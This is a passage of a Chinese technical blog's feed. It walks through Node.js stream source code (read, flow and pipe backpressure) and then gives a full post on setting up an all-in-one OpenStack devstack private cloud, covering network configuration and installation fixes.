(bytesRead &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        self.bytesRead += bytesRead;</span><br><span class="line">        b = thisPool.slice(start, start + bytesRead);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      self.push(b);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>可以看到，实际上每次从源文件里读取的数据大小toRead为<code>var toRead = Math.min(pool.length - pool.used, n);</code><br>然后通过slice()将读出来的数据所在这块内存push到Stream的BufferList里(其实一次push过程并不一定只会slice一次，如果一次的slice过来后<code>state.length &lt; state.highWaterMark</code>,还会循环继续从内部buffer读，具体源代码可以查看push方法有关的maybeReadMore()方法)</p><h3 id="从Stream-read-里来看"><a href="#从Stream-read-里来看" class="headerlink" title="从Stream.read()里来看:"></a>从Stream.read()里来看:</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Readable.prototype.read = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  debug(<span class="string">'read'</span>, n);</span><br><span class="line">  n = <span class="built_in">parseInt</span>(n, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">var</span> state = <span class="keyword">this</span>._readableState;</span><br><span class="line">  <span class="keyword">var</span> nOrig = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n !== <span class="number">0</span>)</span><br><span class="line">    state.emittedReadable = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">0</span> &amp;&amp;</span><br><span class="line">      state.needReadable &amp;&amp;</span><br><span class="line">      (state.length &gt;= state.highWaterMark || state.ended)) &#123;</span><br><span class="line">    debug(<span class="string">'read: emitReadable'</span>, state.length, state.ended);</span><br><span class="line">    <span class="keyword">if</span> (state.length === <span class="number">0</span> &amp;&amp; state.ended)</span><br><span class="line">      endReadable(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      emitReadable(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  n = howMuchToRead(n, state);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">0</span> &amp;&amp; state.ended) &#123;</span><br><span class="line">    <span class="keyword">if</span> (state.length === <span class="number">0</span>)</span><br><span class="line">      endReadable(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> doRead = state.needReadable;</span><br><span class="line">  debug(<span class="string">'need readable'</span>, doRead);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (state.length === <span class="number">0</span> || state.length - n &lt; state.highWaterMark) &#123;</span><br><span class="line">    doRead = <span class="literal">true</span>;</span><br><span class="line">    debug(<span class="string">'length less than watermark'</span>, doRead);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (state.ended || state.reading) &#123;</span><br><span class="line">    doRead = <span class="literal">false</span>;</span><br><span class="line">    debug(<span class="string">'reading or ended'</span>, doRead);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (doRead) &#123;</span><br><span class="line">    debug(<span class="string">'do read'</span>);</span><br><span class="line">    state.reading = <span class="literal">true</span>;</span><br><span class="line">    state.sync = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (state.length === <span class="number">0</span>)</span><br><span class="line">      state.needReadable = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">this</span>._read(state.highWaterMark);</span><br><span class="line">    state.sync = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!state.reading)</span><br><span class="line">      n = howMuchToRead(nOrig, state);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> ret;</span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">    ret = fromList(n, state);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ret = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret === <span class="literal">null</span>) &#123;</span><br><span class="line">    state.needReadable = <span class="literal">true</span>;</span><br><span class="line">    n = <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    state.length -= n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (state.length === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!state.ended)</span><br><span class="line">      state.needReadable = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nOrig !== n &amp;&amp; state.ended)</span><br><span class="line">      endReadable(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret !== <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">this</span>.emit(<span class="string">'data'</span>, ret);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>起初流处于paused状态，根据官方文档所述，可以通过以下三种方式将mode转换为flowing:</p><ol><li>添加data事件监听器</li><li>resume()</li><li>src.pipe()</li></ol><p>然后以此为脉络，从flowing的启动到最终数据的呈现过程分析:</p><p>监听data事件时:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Readable.prototype.on = <span class="function"><span class="keyword">function</span>(<span class="params">ev, fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> res = Stream.prototype.on.call(<span class="keyword">this</span>, ev, fn);</span><br><span class="line">  <span class="keyword">if</span> (ev === <span class="string">'data'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._readableState.flowing !== <span class="literal">false</span>)</span><br><span class="line">      <span class="keyword">this</span>.resume();</span><br><span class="line">  &#125; ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Readable.prototype.resume = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> state = <span class="keyword">this</span>._readableState;</span><br><span class="line">  <span class="keyword">if</span> (!state.flowing) &#123;</span><br><span class="line">    debug(<span class="string">'resume'</span>);</span><br><span class="line">    state.flowing = <span class="literal">true</span>;</span><br><span class="line">    resume(<span class="keyword">this</span>, state);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resume</span>(<span class="params">stream, state</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!state.resumeScheduled) &#123;</span><br><span class="line">    state.resumeScheduled = <span class="literal">true</span>;</span><br><span class="line">    process.nextTick(resume_, stream, state);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resume_</span>(<span class="params">stream, state</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!state.reading) &#123;</span><br><span class="line">    debug(<span class="string">'resume read 0'</span>);</span><br><span class="line">    stream.read(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  state.resumeScheduled = <span class="literal">false</span>;</span><br><span class="line">  state.awaitDrain = <span class="number">0</span>;</span><br><span class="line">  stream.emit(<span class="string">'resume'</span>);</span><br><span class="line">  flow(stream);</span><br><span class="line">  <span class="keyword">if</span> (state.flowing &amp;&amp; !state.reading)</span><br><span class="line">    stream.read(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个关键的一点是<code>read(0)</code>,我们查看<code>Stream.read(n)</code>方法不难知道，当参数n为0时，只会从内部buffer里slice内存到Stream的BufferList里，然后接着有<code>flow(stream)</code>的调用，来看看:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flow</span>(<span class="params">stream</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> state = stream._readableState;</span><br><span class="line">  debug(<span class="string">'flow'</span>, state.flowing);</span><br><span class="line">  <span class="keyword">while</span> (state.flowing &amp;&amp; stream.read() !== <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>循环不断的调用stream.read()，即参数n为undefined,而在Stream.read()里经过<code>parseInt(undfined,10)</code>结果就为NaN了，然后我们从<code>howMuchToRead</code>里看到:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n !== n) &#123;</span><br><span class="line">    <span class="comment">// Only flow one buffer at a time</span></span><br><span class="line">    <span class="keyword">if</span> (state.flowing &amp;&amp; state.length)</span><br><span class="line">      <span class="keyword">return</span> state.buffer.head.data.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> state.length;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>结论就是，Stream添加ondata后，就会每次自动地从BufferList里读取一个Buffer数据，而当<code>state.length === 0 || state.length - n &lt; state.highWaterMark</code>满足时，会执行<code>_.read()</code>操作，数据通过<code>fromList</code>方法得到，最终触发data事件，将Buffer浮现。一直这样直到源数据末尾。</p><h2 id="从pipe-角度看限流"><a href="#从pipe-角度看限流" class="headerlink" title="从pipe()角度看限流"></a>从pipe()角度看限流</h2><p>设想一个场景，我们的readable stream的速度比writable速度快，我们看看Writable Stream的代码:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeOrBuffer</span>(<span class="params">stream, state, isBuf, chunk, encoding, cb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!isBuf) &#123;</span><br><span class="line">    <span class="keyword">var</span> newChunk = decodeChunk(state, chunk, encoding);</span><br><span class="line">    <span class="keyword">if</span> (chunk !== newChunk) &#123;</span><br><span class="line">      isBuf = <span class="literal">true</span>;</span><br><span class="line">      encoding = <span class="string">'buffer'</span>;</span><br><span class="line">      chunk = newChunk;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> len = state.objectMode ? <span class="number">1</span> : chunk.length;</span><br><span class="line"></span><br><span class="line">  state.length += len;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> ret = state.length &lt; state.highWaterMark;</span><br><span class="line">  <span class="comment">// we must ensure that previous needDrain will not be reset to false.</span></span><br><span class="line">  <span class="keyword">if</span> (!ret)</span><br><span class="line">    state.needDrain = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (state.writing || state.corked) &#123;</span><br><span class="line">    <span class="keyword">var</span> last = state.lastBufferedRequest;</span><br><span class="line">    state.lastBufferedRequest = &#123;</span><br><span class="line">      chunk,</span><br><span class="line">      encoding,</span><br><span class="line">      isBuf,</span><br><span class="line">      callback: cb,</span><br><span class="line">      next: <span class="literal">null</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (last) &#123;</span><br><span class="line">      last.next = state.lastBufferedRequest;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      state.bufferedRequest = state.lastBufferedRequest;</span><br><span class="line">    &#125;</span><br><span class="line">    state.bufferedRequestCount += <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    doWrite(stream, state, <span class="literal">false</span>, len, chunk, encoding, cb);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，当<code>state.length</code>超过highWaterMark时，<code>write()</code>就返回false，此时如果我们不暂停readable stream,那么接下来的Buffer都会暂存到BufferedRequest里，我们也可以在<code>write()</code>返回false时，对readable stream暂停，当BuffererdRequest内的数据写入完毕后，会触发<code>drain</code>事件,我们在<code>ondrain</code>里可以resume readable stream。</p><p>正如Readable Stream的pipe()方法:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">src.on(<span class="string">'data'</span>, ondata);</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">ondata</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">var</span> ret = dest.write(chunk);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === ret &amp;&amp; !increasedAwaitDrain) &#123;</span><br><span class="line">      ...</span><br><span class="line">      src.pause();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pipeOnDrain</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> state = src._readableState;</span><br><span class="line">    debug(<span class="string">'pipeOnDrain'</span>, state.awaitDrain);</span><br><span class="line">    <span class="keyword">if</span> (state.awaitDrain)</span><br><span class="line">      state.awaitDrain--;</span><br><span class="line">    <span class="keyword">if</span> (state.awaitDrain === <span class="number">0</span> &amp;&amp; EE.listenerCount(src, <span class="string">'data'</span>)) &#123;</span><br><span class="line">      state.flowing = <span class="literal">true</span>;</span><br><span class="line">      flow(src);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>补充一张图:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/f9a3e300-9b20-11e4-9e14-a6938b3327f0.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/f9a3e300-9b20-11e4-9e14-a6938b3327f0.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章将开启我的Node源码解读系列，结合源码和官方文档，探索其背后的原理。首先想谈谈Stream这强大而又容易误解的功能，文章主要从Buffer/Stream与内存分配的关系角度来分析。&lt;/p&gt;
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="buffer" scheme="http://luoxia.me/code/tags/buffer/"/>
    
      <category term="stream" scheme="http://luoxia.me/code/tags/stream/"/>
    
  </entry>
  
  <entry>
    <title>一个私有云实例的起步</title>
    <link href="http://luoxia.me/code/2017/05/30/%E4%B8%80%E4%B8%AA%E7%A7%81%E6%9C%89%E4%BA%91%E5%AE%9E%E4%BE%8B%E7%9A%84%E8%B5%B7%E6%AD%A5/"/>
    <id>http://luoxia.me/code/2017/05/30/一个私有云实例的起步/</id>
    <published>2017-05-30T02:48:21.000Z</published>
    <updated>2017-11-16T13:10:06.490Z</updated>
    
    <content type="html"><![CDATA[<p>只是一个简单的开始。<br><a id="more"></a></p><p>当云计算老师要求我们在自己笔记本上搭建私有云时我一开始是拒绝的，多耗资源的玩意儿啊，弄一个最低配单机版的，内存就要求动不动就4G+，磁盘40G+。。。</p><p>这一折腾下来，还是学到了不少，总结下一些坑吧。</p><p><strong>资源有限，所有组件在一台虚拟机(all-in-one),客户机为ubuntu 14.04 server版</strong></p><h2 id="虚拟化那些事儿"><a href="#虚拟化那些事儿" class="headerlink" title="虚拟化那些事儿"></a>虚拟化那些事儿</h2><p>这里放一张我画的简单思维导图吧：<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%20.png" alt="virtual technology"></p><h2 id="网络配置那些事儿"><a href="#网络配置那些事儿" class="headerlink" title="网络配置那些事儿"></a>网络配置那些事儿</h2><p>一开始我是选择VirtualBox来搭建的，但在网络配置过程中遇到了一些坑:</p><p>与VMWare不同，VirtualBox只虚拟了一张网卡类似于VMWare的VMnet8，而没有用于宿主机连接客户机的host-only网卡。由于客户os是ubuntu server版，到时候访问dashboard不得不需要宿主机连接客户机。于是又加一张host-only网卡。</p><p>结果发现一个问题：</p><p>在NAT网络正常情况下，临时通过ifconfig来为host网卡配置静态ip，世界美好，但是，当我将配置写入文件时，NAT就挂了，目前还没找到解决方案。</p><p>还有一个问题，我尝试为NAT网卡分配静态IP，发现行不通。</p><p>最终还是投奔VMWare,简单粗暴的NAT网卡，可以禁用DHCP,可以ping通客户机。<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/2017-05-30%2014-06-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/2017-05-29%2014-04-19%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><h3 id="为openstack-Neutron配置网络"><a href="#为openstack-Neutron配置网络" class="headerlink" title="为openstack Neutron配置网络"></a>为openstack Neutron配置网络</h3><p>openstck主机的ip与NAT网卡ip相同:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOST_IP=172.16.38.101</span><br></pre></td></tr></table></figure></p><p>为了外网能够访问dashboard，让br-ex网桥和客户机NAT网卡关联:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">## Neutron options</span><br><span class="line">Q_USE_SECGROUP=True</span><br><span class="line">FLOATING_RANGE=&quot;172.16.38.105/24&quot;</span><br><span class="line">FIXED_RANGE=&quot;10.0.0.0/24&quot;</span><br><span class="line">Q_FLOATING_ALLOCATION_POOL=start=172.16.38.130,end=172.16.38.138</span><br><span class="line">PUBLIC_NETWORK_GATEWAY=&quot;172.16.38.2&quot;</span><br><span class="line">Q_L3_ENABLED=True</span><br><span class="line">PUBLIC_INTERFACE=eth0</span><br><span class="line">Q_USE_PROVIDERNET_FOR_PUBLIC=True</span><br><span class="line">OVS_PHYSICAL_BRIDGE=br-ex</span><br><span class="line">PUBLIC_BRIDGE=br-ex</span><br><span class="line">OVS_BRIDGE_MAPPINGS=public:br-ex</span><br></pre></td></tr></table></figure><p>安装好后可以通过<code>ovs-vsctrl show</code>检查br-ex和eth0的对应关系是否正常:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/2017-05-29%2023-39-59%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><h3 id="instance的网络配置"><a href="#instance的网络配置" class="headerlink" title="instance的网络配置"></a>instance的网络配置</h3><p>一个简单的网络拓扑图:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/2017-05-30%2009-46-59%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p>public用于openstack主机外网访问，与openstack eth0网卡处于同一网段,这里(172.16.38),<br>用于给实例分配floating IP，可以它的范围就是我们在local.conf里关于Neutron options的<br><code>Q_FLOATING_ALLOCATION_POOL=start=172.16.38.130,end=172.16.38.138</code>字段。</p><p>然后private就是实例内部网络了，在创建实例的时候，分配网络就分配private network,可以看到它的范围就是字段<code>FIXED_RANGE=&quot;10.0.0.0/24&quot;</code></p><p>路由器连接public 和 private<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/2017-05-30%2009-48-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><h2 id="stack-sh那些事儿"><a href="#stack-sh那些事儿" class="headerlink" title="stack.sh那些事儿"></a>stack.sh那些事儿</h2><h3 id="镜像源"><a href="#镜像源" class="headerlink" title="镜像源"></a>镜像源</h3><p>网上的文章都将镜像源换成了<code>http://git.trystack.cn</code><br>即:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIT_BASE=http://git.trystack.cn</span><br><span class="line">NOVNC_REPO=http://git.trystack.cn/kanaka/noVNC.git</span><br><span class="line">SPICE_REPO=http://git.trystack.cn/git/spice/spice-html5.git</span><br></pre></td></tr></table></figure></p><p>但发现<code>http://git.trystack.cn/kanaka/noVNC.git</code>直接就是404,安装过程中也因为找不到镜像中断过，应该是镜像源出现问题了，于是我换成了github源。</p><h3 id="djiango问题"><a href="#djiango问题" class="headerlink" title="djiango问题"></a>djiango问题</h3><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/2017-05-29%2019-16-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p>解决办法:</p><p>先查看openstacksdk版本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# python</span><br><span class="line">Python 2.7.6 (default, Oct 26 2016, 20:30:19) </span><br><span class="line">[GCC 4.8.4] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import openstack</span><br><span class="line">&gt;&gt;&gt; import pbr.version</span><br><span class="line">&gt;&gt;&gt; print(pbr.version.VersionInfo(&apos;openstacksdk&apos;).version_string())</span><br><span class="line">0.8.1</span><br><span class="line">&gt;&gt;&gt; quit()</span><br></pre></td></tr></table></figure></p><p>修改<code>/usr/local/lib/python2.7/dist-packages/openstack/session.py</code>里的<code>DEFAULT_USER_AGENT = &quot;openstacksdk/%s&quot; % openstack.__version__</code>为:<br><code>DEFAULT_USER_AGENT = &quot;openstacksdk/0.8.1&quot;</code><br>重新安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./unstack.sh</span><br><span class="line">./clean.sh</span><br><span class="line">./stack.sh</span><br></pre></td></tr></table></figure></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="想重启服务"><a href="#想重启服务" class="headerlink" title="想重启服务?"></a>想重启服务?</h3><p>当重启虚拟机后，发现宿主机和客户机互相都ping不通了，又是一个坑，因为eth0 桥接到br-ex 上面去了，而重启后br-ex 没有ip 配置，把eth0 从 br-ex 上去掉，或者手动通过ifconfig 给 br-ex 配置ip ，都可以解决问题。</p><p>对于重启服务，之前的openstack是有<code>rejoin-stack.sh</code>方式的，但官方已经不推荐这种做法。</p><p>所以我就直接针对于安装完毕的状态创建快照，下次直接恢复就是了(那么上面的网络问题也就不是问题了)。</p><h3 id="安全访问控制"><a href="#安全访问控制" class="headerlink" title="安全访问控制"></a>安全访问控制</h3><p>在配置安全访问的时候，如果直接使用default secure会导致openstack主机没法ping通实例floating IP,或者ssh连接，需要自定义规则:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/2017-05-30%2009-47-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这只是一个简单的开始，更多理论知识和实践，有待积累。</p><p>最后进入我们创建的实例去看看吧。一个简单的私有云实例。<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/2017-05-30%2009-49-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p>最后，端午安康！</p><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1496141480309&amp;di=bca5c982a951ff8a9fcf90b90ba30fe5&amp;imgtype=0&amp;src=http%3A%2F%2Fppt.downhot.com%2Fd%2Ffile%2Fp%2F2014%2F06%2F24%2F768749e5278c9f0cb2aabc3728f0e75a.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;只是一个简单的开始。&lt;br&gt;
    
    </summary>
    
      <category term="云计算" scheme="http://luoxia.me/code/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
    
      <category term="云计算" scheme="http://luoxia.me/code/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
      <category term="openstack" scheme="http://luoxia.me/code/tags/openstack/"/>
    
      <category term="私有云" scheme="http://luoxia.me/code/tags/%E7%A7%81%E6%9C%89%E4%BA%91/"/>
    
  </entry>
  
  <entry>
    <title>Docker初步实践</title>
    <link href="http://luoxia.me/code/2017/04/01/docker%E5%88%9D%E6%AD%A5%E5%AE%9E%E8%B7%B5/"/>
    <id>http://luoxia.me/code/2017/04/01/docker初步实践/</id>
    <published>2017-04-01T11:41:23.000Z</published>
    <updated>2017-11-16T13:10:06.486Z</updated>
    
